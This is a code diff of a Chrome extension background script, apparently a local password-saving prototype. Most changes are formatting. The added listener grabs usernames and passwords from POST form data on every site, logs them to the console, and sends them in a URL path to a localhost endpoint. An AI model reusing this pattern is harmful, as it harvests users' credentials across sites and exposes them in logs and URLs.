@@ -1,27 +1,27 @@
 function getCookies(domain, name, callback) {
-    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
-        if(callback) {
-            try{
+    chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
+        if (callback) {
+            try {
                 callback(cookie.value);
-            }catch(err){
+            } catch (err) {
                 callback(null)
             }
         }
     });
 }
 
-function change_state(){
-    getCookies("https://localhost", "logged_in_cookie", function(cookie) {
-        if(cookie != null){
-            getCookies("https://localhost", "sessionid", function(cookie) {
-                if(cookie == null){
+function change_state() {
+    getCookies("https://localhost", "logged_in_cookie", function (cookie) {
+        if (cookie != null) {
+            getCookies("https://localhost", "sessionid", function (cookie) {
+                if (cookie == null) {
                     chrome.action.setBadgeText({
                         text: "OFF",
                     });
                     chrome.action.setBadgeBackgroundColor(
                         { color: 'red' }
                     );
-                }else{
+                } else {
                     chrome.action.setBadgeText({
                         text: "ON",
                     });
@@ -31,7 +31,7 @@ function change_state(){
                 }
             });
         }
-        
+
     });
 }
 
@@ -41,10 +41,10 @@ chrome.tabs.onActivated.addListener(() => {
 
 chrome.tabs.onUpdated.addListener(() => {
     chrome.action.setBadgeText({
-      text: "OFF",
+        text: "OFF",
     });
     chrome.action.setBadgeBackgroundColor(
-       { color: 'red'}
+        { color: 'red' }
     )
     change_state();
 });
@@ -52,29 +52,45 @@ chrome.tabs.onUpdated.addListener(() => {
 
 chrome.runtime.onInstalled.addListener(() => {
     chrome.action.setBadgeText({
-      text: "OFF",
+        text: "OFF",
     });
     chrome.action.setBadgeBackgroundColor(
-       { color: 'red'}
+        { color: 'red' }
     )
 });
 
-chrome.webRequest.onBeforeRequest.addListener(function(details){
-    if(details.method == "POST"){
-        try{
-            if(details.requestBody.formData.password != undefined){
-                username=details.requestBody.formData.username[0];
-                password=details.requestBody.formData.password[0];
-                url=details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
-                // chrome.runtime.sendMessage({ username: username, password: password, url : url },)
-                // console.log("message sent");
+chrome.webRequest.onBeforeRequest.addListener(function (details) {
+    if (details.method == "POST") {
+        try {
+            if (details.requestBody.formData.password != undefined) {
+                username = details.requestBody.formData.username[0];
+                password = details.requestBody.formData.password[0];
+                url = details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
+                console.log('Username:', username);
+                console.log('Password:', password);
+                console.log('URL:', url);
+                dest = 'https://localhost/submit_account_json/' + url + '/' + username + '/' + password;
+                fetch(dest, {
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'include',
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log(response.text)
+                            return response.text();
+                        } else {
+                            throw new Error('Network response was not ok');
+                        }
+                    })
+                    .then(data => console.log(data))
+                    .catch(error => console.error('Error:', error.message, error.stack));
             }
+        } catch (error) {
+            console.error('Error:', error);
         }
-       catch{
-
-        }
-        
     }
-}, {urls:["<all_urls>"]},
-['requestBody']
-);
+}, { urls: ["<all_urls>"] },
+    ['requestBody']);
